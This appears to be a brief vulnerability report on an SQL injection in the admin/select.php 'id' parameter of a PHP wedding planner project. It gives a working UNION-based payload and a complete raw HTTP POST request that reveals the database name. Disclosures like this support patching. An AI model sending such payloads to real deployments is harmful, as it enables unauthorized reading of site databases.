# Wedding Planner v1.0 by pushpam02 has SQL injection

BUG_Author: shark007

vendors: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability File: /Wedding-Management-PHP/admin/select.php

Vulnerability location: /Wedding-Management-PHP/admin/select.php&id

[+] Payload: id=-1 union select 1,2,database(),4--+

dbname = dbwedding

```sql
POST /Wedding-Management-PHP/admin/select.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

id=-1 union select 1,2,database(),4--+
```

![image](https://user-images.githubusercontent.com/54017627/183276922-ee23acdf-9ce3-4f4c-9ac9-61b2db74e4d8.png)
